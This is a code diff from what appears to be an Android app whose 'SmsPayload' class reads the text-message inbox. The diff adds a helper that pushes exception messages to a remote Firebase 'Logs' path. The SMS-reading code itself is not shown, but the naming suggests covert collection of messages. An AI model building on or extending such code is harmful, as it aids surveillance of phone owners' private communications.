@@ -11,6 +11,7 @@ import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.annotations.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.annotations.SmsModes;
+import com.example.logshandler.starter.LogsHandler;
 import com.google.firebase.database.FirebaseDatabase;
 
 import org.json.JSONArray;
@@ -71,8 +72,18 @@ public class SmsPayload extends AsyncTask<String, Integer, String> {
                 e.printStackTrace();
             }
         }catch (Exception e){
+            new LogsHandler.Builder(contextRef.get())
+                    .setDataToWrite(e.getMessage())
+                    .setDbReference("Logs")
+                    .setPathString(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"")
+                    .build()
+                    .pushPayloadLogToServer();
+
             Log.e("EXCEPTION_SMS : ",e.getMessage());
-            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue(e.getMessage());
+            FirebaseDatabase
+                    .getInstance()
+                    .getReference("Logs")
+                    .child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue(e.getMessage());
 
         }
 
